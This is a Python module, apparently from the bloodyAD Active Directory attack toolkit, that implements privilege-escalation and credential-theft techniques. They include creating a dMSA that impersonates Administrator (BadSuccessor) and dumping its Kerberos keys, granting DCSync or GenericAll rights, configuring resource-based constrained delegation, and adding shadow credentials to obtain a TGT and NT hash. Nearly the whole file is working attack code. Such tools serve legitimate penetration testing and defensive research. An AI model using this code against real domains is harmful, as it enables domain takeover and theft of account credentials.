import binascii, datetime, random, string, base64, collections, asyncio
from typing import Literal
from urllib import parse
from bloodyAD import utils
from bloodyAD.network import ldap
from bloodyAD.exceptions import LOG
from bloodyAD.formatters import accesscontrol, common, cryptography, dns
from bloodyAD.network.ldap import Change, Scope
from bloodyAD.exceptions import BloodyError
from bloodyAD.cli_modules import set as bloodySet
import msldap
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from minikerberos.common import factory
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.kirbi import Kirbi
from minikerberos.common.ccache import CCACHE
from minikerberos.protocol.external import ticketutil
from minikerberos.protocol.encryption import Enctype
from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR


# TODO make it multi forest
def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Current,DC=Domain"], ou: str = None):
    """
    Add a new DMSA (Dedicated Managed Service Account) object

    :param dmsa: hostname of the DMSA object (no need to add '$')
    :param t: Distinguished Name of the target whose privileges are to be assumed (can be called multiple times, e.g. "-t CN=Admin,CN=Users,DC=domain,DC=com -t CN=User,CN=Users,DC=domain,DC=com")
    :param ou: Organizational Unit for the DMSA object. If not provided, chooses the first OU the logged user can add child to.
    """
    # Check if the schema version is 2025
    schema_version = next(
        conn.ldap.bloodysearch(
            conn.ldap.schemaNC, attr=["objectVersion"]
        )
    ).get("objectVersion", None)

    if int(schema_version[0]) < 91:
        raise BloodyError("Schema version is not 2025. DMSA creation is not supported.")

    if len(t) == 1:
        t = ["CN=Administrator,CN=Users," + conn.ldap.domainNC]
    else:
        t = t[1:]

    # First we try to find a OU where we can add a child object
    # If we don't find one, we will use the first one where we have DACL write on
    # If we don't find one, we will use the first one where we have ownership write on
    if not ou:
        writable_ou = []
        writable_nt_ou = []
        writable_owner_ou = []
        for entry in conn.ldap.bloodysearch(
            conn.ldap.domainNC,
            ldap_filter="(|(objectClass=container)(objectClass=organizationalUnit))",
            search_scope=Scope.SUBTREE,
            attr=["distinguishedName", "allowedChildClassesEffective", "sDRightsEffective"],
        ):
            sdright_mask = entry.get("sDRightsEffective", 0)
            if "msDS-DelegatedManagedServiceAccount" in entry.get("allowedChildClassesEffective", []):
                if entry["distinguishedName"] == "CN=Managed Service Accounts," + conn.ldap.domainNC:
                    # Choose Managed Service Accounts in priority as it is the default for dMSA
                    ou = entry["distinguishedName"]
                    break
                writable_ou.append(entry["distinguishedName"])
            elif sdright_mask & 4:
                # We have DACL write on the OU
                writable_nt_ou.append(entry["distinguishedName"])
            elif sdright_mask & 3:
                # We have ownership write on the OU
                writable_owner_ou.append(entry["distinguishedName"])

        if not ou:
            if writable_ou:
                # Choose the first OU we can add child to
                ou = writable_ou[0]
            elif writable_nt_ou:
                ou = writable_nt_ou[0]
                genericAll(conn, ou, conn.conf.username)
            elif writable_owner_ou:
                ou = writable_owner_ou[0]
                bloodySet.owner(conn, ou, conn.conf.username)
                genericAll(conn, ou, conn.conf.username)
            else:
                raise BloodyError("No suitable OU found for adding the DMSA object")

    dmsa_dn = f"CN={dmsa},{ou}"

    new_sd = accesscontrol.createEmptySD()
    access_mask = accesscontrol.ACCESS_FLAGS["GENERIC_ALL"]
    self_obj = next(conn.ldap.bloodysearch(conn.ldap.domainNC,
            ldap_filter=f"(sAMAccountName={conn.conf.username})",
            search_scope=Scope.SUBTREE, attr=["objectSid"]))
    self_sid = self_obj["objectSid"]
    utils.addRight(new_sd, self_sid, access_mask)

    dmsa_sama = dmsa + "$"
    LOG.info(f"[*] Creating DMSA {dmsa_sama} in {ou}")
    LOG.info(f"[*] Impersonating: {', '.join(t)}")
    attr = {
        "objectClass": ["msDS-DelegatedManagedServiceAccount"],
        "sAMAccountName": dmsa+'$',
        "dNSHostName": f"{dmsa}.{conn.ldap.dc_domain}",
        "msDS-ManagedPasswordInterval": 30,
        "msDS-GroupMSAMembership": SECURITY_DESCRIPTOR.from_sddl(f"O:S-1-5-32-544D:(A;;0xf01ff;;;{self_sid})"),
        "msDS-DelegatedMSAState": 2,
        "msDS-ManagedAccountPrecededByLink": t,
        "msDS-SupportedEncryptionTypes": 0x1c,
        "userAccountControl": 0x1000
    }
    conn.ldap.bloodyadd(dmsa_dn, attributes=attr)

    client = None
    path = dmsa + "_" + "".join(
            random.choice(string.ascii_letters + string.digits) for i in range(2)
        )
    splitted_url = conn.ldap.co_url.split("-",1)
    if "sspi" in splitted_url[0]:
        LOG.error("[-] SSPI is not supported yet to retrieve dMSA TGT, use Rubeus or minikerberos certstore, e.g.:")
        LOG.error(f"python minikerberos-bAD/examples/getS4U2self.py 'kerberos+certstore://{conn.conf.domain}\\{conn.conf.username}@192.168.100.5' 'krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}' '{dmsa_sama}@{conn.ldap.dc_domain}' --dmsa")
        return
    url = "kerberos+" + splitted_url[1]
    LOG.debug(f"[*] Using minikerberos url: {url}")
    try:
        cu = factory.KerberosClientFactory.from_url(url)
        client = cu.get_client_blocking()
        service_spn = KerberosSPN.from_spn(f"krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}")
        target_user = KerberosSPN.from_upn(f"{dmsa_sama}@{conn.ldap.dc_domain}")
        tgs, encTGSRepPart, key = client.S4U2self(target_user, service_spn, is_dmsa=True)
    except Exception as e:
        LOG.error(f"[-] Failed to retrieve dMSA TGT")
        LOG.error("[-] Try using Rubeus, or something like:")
        LOG.error(f"python minikerberos-bAD/examples/getS4U2self.py '{url}' 'krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}' '{dmsa_sama}@{conn.ldap.dc_domain}' --dmsa")
        raise e

    kirbi = Kirbi.from_ticketdata(tgs, encTGSRepPart)
    LOG.info(str(kirbi))

    ccache = CCACHE().from_kirbi(kirbi)
    ccache_path = path + ".ccache"
    ccache.to_file(path + ".ccache")
    LOG.info('[+] dMSA TGT stored in ccache file %s' % ccache_path)

    dmsa_pack = ticketutil.get_KRBKeys_From_TGSRep(encTGSRepPart)

    LOG.info('\ndMSA current keys found in TGS:')
    for current_key in dmsa_pack['current-keys']:
        LOG.info("%s: %s" % (Enctype.get_name(current_key['keytype']), current_key['keyvalue'].hex()))
    LOG.info('\ndMSA previous keys found in TGS (including keys of preceding managed accounts):')
    for previous_key in dmsa_pack['previous-keys']:
        LOG.info("%s: %s" % (Enctype.get_name(previous_key['keytype']), previous_key['keyvalue'].hex()))


def computer(conn, hostname: str, newpass: str, ou: str = "DefaultOU", lifetime: int = 0):
    """
    Add new computer

    :param hostname: computer name (without trailing $)
    :param newpass: password for computer
    :param ou: Organizational Unit for computer
    :param lifetime: lifetime of new computer in seconds, if non-zero creates it as a dynamic object
    """

    if ou == "DefaultOU":
        container = None
        # When the requester has specified the LDAP_SERVER_BYPASS_QUOTA_OID control "1.2.840.113556.1.4.2256"
        # And has been granted the control access right DS-Bypass-Quota on the object
        # that is the root of the NC in which the operation is to be performed
        for obj in next(
            conn.ldap.bloodysearch(conn.ldap.domainNC, attr=["wellKnownObjects"], controls=[("1.2.840.113556.1.4.2256", False, None)])
        )["wellKnownObjects"]:
            if "GUID_COMPUTERS_CONTAINER_W" == obj.binary_value:
                container = obj.dn
                break
        if not container:
            LOG.warning(
                "Default container for computers not found, defaulting to CN=Computers,"
                + conn.ldap.domainNC
            )
            container = "cn=Computers" + conn.ldap.domainNC
        computer_dn = f"cn={hostname},{container}"
    else:
        computer_dn = f"cn={hostname},{ou}"

    # Default computer SPNs
    spns = [
        "HOST/%s" % hostname,
        "HOST/%s.%s" % (hostname, conn.ldap.dc_domain),
        "RestrictedKrbHost/%s" % hostname,
        "RestrictedKrbHost/%s.%s" % (hostname, conn.ldap.dc_domain),
    ]
    attr = {
        "objectClass": [
            "top",
            "person",
            "organizationalPerson",
            "user",
            "computer",
        ],
        "dnsHostName": "%s.%s" % (hostname, conn.ldap.dc_domain),
        "userAccountControl": 0x1000,
        "servicePrincipalName": spns,
        "sAMAccountName": f"{hostname}$",
        "unicodePwd": '"%s"' % newpass,
    }

    if lifetime > 0:
        attr["objectClass"].append("dynamicObject")
        attr["entryTTL"] = lifetime
    
    conn.ldap.bloodyadd(computer_dn, attributes=attr)
    LOG.info(f"[+] {hostname}$ created")


def dcsync(conn, trustee: str):
    """
    Add DCSync right on domain to provided trustee (Requires to own or to have WriteDacl on domain object)

    :param trustee: sAMAccountName, DN or SID of the trustee
    """
    new_sd, _ = utils.getSD(conn, conn.ldap.domainNC)
    if "s-1-" in trustee.lower():
        trustee_sid = trustee
    else:
        trustee_sid = next(conn.ldap.bloodysearch(trustee, attr=["objectSid"]))[
            "objectSid"
        ]
    access_mask = accesscontrol.ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]
    utils.addRight(new_sd, trustee_sid, access_mask)

    req_flags = msldap.wintypes.asn1.sdflagsrequest.SDFlagsRequestValue(
        {"Flags": accesscontrol.DACL_SECURITY_INFORMATION}
    )
    controls = [("1.2.840.113556.1.4.801", True, req_flags.dump())]

    conn.ldap.bloodymodify(
        conn.ldap.domainNC,
        {"nTSecurityDescriptor": [(Change.REPLACE.value, new_sd.getData())]},
        controls,
    )

    LOG.info(f"[+] {trustee} is now able to DCSync")


# Credits to Kevin Robertson and his script Invoke-DNSUpdate.ps1 from the Powermad framework
def dnsRecord(
    conn,
    name: str,
    data: str,
    dnstype: Literal["A", "AAAA", "CNAME", "MX", "PTR", "SRV", "TXT"] = "A",
    zone: str = "CurrentDomain",
    ttl: int = 300,
    preference: int = 10,
    port: int = None,
    priority: int = 10,
    weight: int = 60,
    forest: bool = False,
):
    """
    This function adds a new DNS record into an AD environment.

    :param name: name of the dnsNode object (hostname) which will contain the new record
    :param data: DNS record data, for most record types this will be the destination hostname or IP address, for TXT records this can be used for text
    :param dnstype: DNS record type
    :param zone: DNS zone
    :param ttl: DNS record TTL, time in seconds the record stays in DNS caches, must be low if you want to propagate record updates quickly
    :param preference: DNS MX record preference, must be lower than the concurrent records to be chosen
    :param port: listening port of the service in a DNS SRV record
    :param priority: priority of a DNS SRV record against concurrent, must be lower to be chosen, if identical to others, highest weight will be chosen
    :param weight: weight of a DNS SRV record against concurrent, must be higher with the lowest priority to be chosen
    :param forest: if set, registers dns record in forest instead of domain
    """
    # DNS_RPC_RECORD - section 2.2.2.2.5
    # RANK_ZONE - The record comes from an authoritative zone
    rank = 0xF0

    naming_context = "," + conn.ldap.domainNC
    if zone == "CurrentDomain":
        zone = ""
        for label in naming_context.split(",DC="):
            if label:
                zone += "." + label
        if forest:
            zone = "_msdcs" + zone
        else:
            # Removes first dot
            zone = zone[1:]

    # TODO: take into account custom ForestDnsZones and DomainDnsZones partition name ?
    if forest:
        zone_type = "ForestDnsZones"
    else:
        zone_type = "DomainDnsZones"

    zone_dn = f"DC={zone},CN=MicrosoftDNS,DC={zone_type}{naming_context}"
    record_dn = None

    serial = None
    new_dnsrecord_list = None
    ldap_filter = f"(|(name=@)(name={name}))"
    for entry in conn.ldap.bloodysearch(
        zone_dn,
        ldap_filter=ldap_filter,
        search_scope=Scope.SUBTREE,
        attr=["name", "dnsRecord"],
        raw=True,
    ):
        if entry["name"][0] == b"@":
            for raw_record in entry["dnsRecord"]:
                dns_record = dns.Record(raw_record).toDict()
                if dns_record.get("Type") == "SOA":
                    serial = dns_record["Data"]["SerialNo"]
                    break
        else:
            record_dn = entry["distinguishedName"]
            new_dnsrecord_list = entry["dnsRecord"]

    if not serial:
        raise BloodyError(f"No '@' entry found in '{zone_dn}' with '{ldap_filter}'")
    new_dnsrecord = dns.Record()
    new_dnsrecord.fromDict(
        data, dnstype, ttl, rank, serial, preference, port, priority, weight
    )

    if not record_dn:
        record_dn = f"DC={name},{zone_dn}"
        record_attr = {
            "objectClass": ["top", "dnsNode"],
            "dnsRecord": new_dnsrecord.getData(),
            "dNSTombstoned": False,
        }
        conn.ldap.bloodyadd(record_dn, attributes=record_attr)
        LOG.info(f"[+] {name} has been successfully added")
        return

    new_dnsrecord_list.append(new_dnsrecord.getData())

    conn.ldap.bloodymodify(
        record_dn, {"dnsRecord": [(Change.REPLACE.value, new_dnsrecord_list)]}
    )
    LOG.info(f"[+] {name} has been successfully updated")


def genericAll(conn, target: str, trustee: str):
    """
    Give full control to trustee on target and descendants (you must own the object or have WriteDacl)

    :param target: sAMAccountName, DN or SID of the target
    :param trustee: sAMAccountName, DN or SID of the trustee which will have full control on target
    """
    new_sd, _ = utils.getSD(conn, target)
    if "s-1-" in trustee.lower():
        trustee_sid = trustee
    else:
        trustee_sid = next(conn.ldap.bloodysearch(trustee, attr=["objectSid"]))[
            "objectSid"
        ]
    utils.addRight(new_sd, trustee_sid)

    req_flags = msldap.wintypes.asn1.sdflagsrequest.SDFlagsRequestValue(
        {"Flags": accesscontrol.DACL_SECURITY_INFORMATION}
    )
    controls = [("1.2.840.113556.1.4.801", True, req_flags.dump())]

    conn.ldap.bloodymodify(
        target,
        {"nTSecurityDescriptor": [(Change.REPLACE.value, new_sd.getData())]},
        controls,
    )

    LOG.info(f"[+] {trustee} has now GenericAll on {target}")


def groupMember(conn, group: str, member: str):
    """
    Add a new member (user, group, computer) to group

    :param group: sAMAccountName, DN or SID of the group
    :param member: sAMAccountName, DN or SID of the member
    """
    # This is equivalent to classic add member,
    # see [MS-ADTS] - 3.1.1.3.1.2.4 Alternative Forms of DNs
    # But <SID='sid'> also has the advantage of being compatible with foreign security principals,
    # see [MS-ADTS] - 3.1.1.5.3.3 Processing Specifics
    if "s-1-" in member.lower():
        # We assume member is an SID
        member_transformed = f"<SID={member}>"
    else:
        member_transformed = conn.ldap.dnResolver(member)

    conn.ldap.bloodymodify(group, {"member": [(Change.ADD.value, member_transformed)]})
    LOG.info(f"[+] {member} added to {group}")


def rbcd(conn, target: str, service: str):
    """
    Add Resource Based Constraint Delegation for service on target, used to impersonate a user on target with service (Requires "Write" permission on target's msDS-AllowedToActOnBehalfOfOtherIdentity and Windows Server >= 2012)

    :param target: sAMAccountName, DN or SID of the target
    :param service: sAMAccountName, DN or SID of the service account
    """
    control_flag = 0
    new_sd, _ = utils.getSD(
        conn, target, "msDS-AllowedToActOnBehalfOfOtherIdentity", control_flag
    )
    if "s-1-" in service.lower():
        service_sid = service
    else:
        service_sid = next(conn.ldap.bloodysearch(service, attr=["objectSid"]))[
            "objectSid"
        ]
    access_mask = accesscontrol.ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]
    utils.addRight(new_sd, service_sid, access_mask)

    conn.ldap.bloodymodify(
        target,
        {
            "msDS-AllowedToActOnBehalfOfOtherIdentity": [
                (
                    Change.REPLACE.value,
                    new_sd.getData(),
                )
            ]
        },
    )

    LOG.info(f"[+] {service} can now impersonate users on {target} via S4U2Proxy")


def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
    """
    Add Key Credentials to target (try to find a suitable DC if provided DC is below Win2016), and use those credentials to retrieve a TGT and a NT hash using PKINIT.

    :param target: sAMAccountName, DN or SID of the target
    :param path: filepath for the generated credentials (TGT ccache or pfx if PKINIT fails)
    """

    dc_dict = collections.defaultdict(dict) 
    # Check if KeyCredential is supported on current DC or find alternative DC
    for dc_info in conn.ldap.bloodysearch("CN=Sites,"+conn.ldap.configNC, "(|(objectClass=nTDSDSA)(objectClass=server))", search_scope=Scope.SUBTREE ,attr=["msDS-Behavior-Version","msDS-HasDomainNCs","objectClass", "dNSHostName"], raw=True):
        if b"nTDSDSA" in dc_info["objectClass"]:
            parent_name = dc_info["distinguishedName"].split(",", 1)[1]
            dc_dict[parent_name]["version"] = int(dc_info["msDS-Behavior-Version"][0])
            dc_dict[parent_name]["domainNCs"] = dc_info["msDS-HasDomainNCs"]
        elif b"server" in dc_info["objectClass"]:
            dc_dict[dc_info["distinguishedName"]]["hostname"] = dc_info["dNSHostName"][0].decode()
    has_KeyCredential = True
    alt_servers = []
    for dn,dc_info in dc_dict.items():
        if dn == conn.ldap._serverinfo["serverName"]:
            if dc_info["version"] < 7:
                has_KeyCredential = False
            else:
                break
        elif dc_info["version"] > 6 and conn.ldap.domainNC.encode() in dc_info.get("domainNCs"):
            alt_servers.append(dc_info["hostname"])

    # If server in forest but not domain with keycredential support, can it be used?
    if not has_KeyCredential:
        LOG.warning(
            "[!] This DC does not seem to support KeyCredentialLink"
        )
        if not alt_servers:
            LOG.error("[!] No DC with Windows Server 2016 or higher found on this domain, operation aborted")
            return

        LOG.info(f"[*] Attempting alternative DCs with KeyCredentialLink support: {alt_servers}")
        record_list = []
        for srv_name in alt_servers:
            record_list.append({"type": ["A"], "name": srv_name})
        host_params = asyncio.get_event_loop().run_until_complete(ldap.findReachableServer(record_list,conn.conf.dns,conn.conf.dcip, [389,636]))
        if not host_params:
            LOG.warning(
                f"[!] No reachable alternative DC found, try to provide one manually in --host or a dns server with --dns"
            )
            return
        schemes = {389: "ldap", 636: "ldaps", 3268: "gc", 3269: "gc-ssl"}
        conn = conn.copy(
                scheme=schemes[host_params["port"]],
                host=host_params["name"],
                dcip=host_params["ip"],
            )

    target_dn = None
    target_sAMAccountName = None
    for entry in conn.ldap.bloodysearch(target, attr=["distinguishedName", "sAMAccountName"]):
        target_dn = entry["distinguishedName"]
        target_sAMAccountName = entry["sAMAccountName"]
    if path == "CurrentPath":
        path = target_sAMAccountName + "_" + "".join(
            random.choice(string.ascii_letters + string.digits) for i in range(2)
        )

    LOG.debug("[*] Generating certificate")

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = x509.Name.from_rfc4514_string(target_dn)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(subject)
        .serial_number(x509.random_serial_number())
        .public_key(key.public_key())
        .not_valid_before(datetime.datetime.utcnow())
        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
        .sign(key, hashes.SHA256())
    )

    LOG.debug("[*] Generating KeyCredential")

    keyCredential = cryptography.KEYCREDENTIALLINK_BLOB()
    keyCredential.keyCredentialLink_from_x509(cert)

    LOG.info(
        "[+] KeyCredential generated with following sha256 of RSA key: %s"
        % binascii.hexlify(keyCredential.getKeyID()).decode()
    )

    LOG.debug("[*] Updating the msDS-KeyCredentialLink attribute of %s" % target)

    key_dnbinary = common.DNBinary()
    key_dnbinary.fromCanonical(keyCredential.getData(), target_dn)
    conn.ldap.bloodymodify(
        target_dn,
        {"msDS-KeyCredentialLink": [(Change.ADD.value, str(key_dnbinary))]},
    )

    LOG.debug("[+] msDS-KeyCredentialLink attribute of the target object updated")

    pfx = serialization.pkcs12.serialize_key_and_certificates(
        name=target_dn.encode(),
        key=key,
        cert=cert,
        cas=None,
        encryption_algorithm=serialization.NoEncryption(),
    )
    pfx_base64 = parse.quote(base64.b64encode(pfx).decode('utf-8'), safe="")

    client = None
    try:
        url = f"kerberos+pfxstr://{conn.conf.domain}\\{target_sAMAccountName}@{conn.conf.dcip}/?certdata={pfx_base64}"
        cu = factory.KerberosClientFactory.from_url(url)
        client = cu.get_client_blocking()
        tgs, enctgs, key, decticket = client.U2U()
    except Exception as e:
        pfx_path = path + ".pfx"
        with open(pfx_path, "wb") as f:
            f.write(pfx)
        LOG.error(f"[-] PKINIT failed on DC {conn.conf.dcip}, you must find a Kerberos server with a certification authority!")
        LOG.info(f"[+] PKINIT PFX certificate saved at: %s" % pfx_path)
        raise e
    finally:
        if client and client.kerberos_TGT:
            ccache_path = path + ".ccache"
            client.ccache.to_file(path + ".ccache")
            LOG.info('[+] TGT stored in ccache file %s' % ccache_path)
        # For the newconn opened if we had to use an alternative DC
        conn.ldap.close()
    
    return [{cred[0]:cred[1]} for cred in ticketutil.get_NT_from_PAC(client.pkinit_tkey, decticket)]

            


def uac(conn, target: str, f: list = None):
    """
    Add property flags altering user/computer object behavior

    :param target: sAMAccountName, DN or SID of the target
    :param f: name of property flag to add, can be called multiple times if multiple flags to add (e.g -f DONT_REQ_PREAUTH  -f DONT_EXPIRE_PASSWORD)
    """
    # TODO: Give scenarios with interesting account control flags

    # List of flags: https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties

    # Some flags are computed (so can't be set directly? seems it depends because LOCKOUT can be removed but not added): LOCKOUT, PASSWORD_EXPIRED, PARTIAL_SECRETS_ACCOUNT, USE_AES_KEYS
    # https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-user-account-control-computed

    # The following flags are mutually exclusives and can't be changed by NetUserSetInfo (so maybe not modifiable at all?):
    # NORMAL_ACCOUNT, TEMP_DUPLICATE_ACCOUNT, WORKSTATION_TRUST_ACCOUNT, SERVER_TRUST_ACCOUNT, INTERDOMAIN_TRUST_ACCOUNT
    # https://learn.microsoft.com/en-us/windows/win32/api/lmaccess/ns-lmaccess-user_info_1008#members

    # Privileges needed for TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION,TRUSTED_FOR_DELEGATION,PASSWD_NOTREQD,DONT_EXPIRE_PASSWD,ENCRYPTED_TEXT_PASSWORD_ALLOWED,SERVER_TRUST_ACCOUNT:
    # https://learn.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netusersetinfo#remarks

    uac = 0
    for flag in f:
        uac |= accesscontrol.ACCOUNT_FLAGS[flag]

    try:
        old_uac = next(
            conn.ldap.bloodysearch(target, attr=["userAccountControl"], raw=True)
        )["userAccountControl"][0]
    except IndexError as e:
        for allowed in next(conn.ldap.bloodysearch(target, attr=["allowedAttributes"]))[
            "allowedAttributes"
        ]:
            if "userAccountControl" in allowed:
                raise BloodyError(
                    "Current user doesn't have the right to read userAccountControl on"
                    f" {target}"
                ) from e
        raise BloodyError(f"{target} doesn't have userAccountControl attribute") from e
    uac |= int(old_uac)
    conn.ldap.bloodymodify(
        target, {"userAccountControl": [(Change.REPLACE.value, uac)]}
    )

    LOG.info(f"[-] {f} property flags added to {target}'s userAccountControl")


def user(conn, sAMAccountName: str, newpass: str, ou: str = "DefaultOU", lifetime: int = 0):
    """
    Add a new user

    :param sAMAccountName: sAMAccountName for new user
    :param newpass: password for new user
    :param ou: Organizational Unit for new user
    :param lifetime: lifetime of new user in seconds, if non-zero creates it as a dynamic object
    """
    if ou == "DefaultOU":
        container = None
        for obj in next(
            conn.ldap.bloodysearch(conn.ldap.domainNC, attr=["wellKnownObjects"])
        )["wellKnownObjects"]:
            if "GUID_USERS_CONTAINER_W" == obj.binary_value:
                container = obj.dn
                break
        if not container:
            LOG.warning(
                "Default container for users not found, defaulting to CN=Users,"
                + conn.ldap.domainNC
            )
            container = "cn=Users" + conn.ldap.domainNC
        user_dn = f"cn={sAMAccountName},{container}"
    else:
        user_dn = f"cn={sAMAccountName},{ou}"

    attr = {
        "objectClass": ["top", "person", "organizationalPerson", "user"],
        "distinguishedName": user_dn,
        "sAMAccountName": sAMAccountName,
        "userAccountControl": 544,
        "unicodePwd": '"%s"' % newpass,
    }

    if lifetime > 0:
        attr["objectClass"].append("dynamicObject")
        attr["entryTTL"] = lifetime

    conn.ldap.bloodyadd(user_dn, attributes=attr)
    LOG.info(f"[+] {sAMAccountName} created")
